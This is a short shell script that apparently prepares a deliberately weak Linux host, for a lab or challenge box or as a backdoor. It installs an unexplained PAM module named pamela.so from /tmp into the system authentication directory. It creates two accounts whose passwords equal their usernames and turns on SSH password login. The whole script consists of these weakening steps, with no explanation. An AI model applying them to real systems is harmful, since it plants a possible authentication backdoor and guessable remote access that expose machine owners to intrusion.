mv /tmp/pamela.so /lib/x86_64-linux-gnu/security/pamela.so

useradd rotta_f -m -p $(perl -e 'print crypt("rotta_f", "password")')
useradd sommer_q -m -p $(perl -e 'print crypt("sommer_q", "password")')

sed -i "/PasswordAuthentication no/c\PasswordAuthentication yes" /etc/ssh/sshd_config

service ssh restart

echo "DAMN SON, Ready to fire"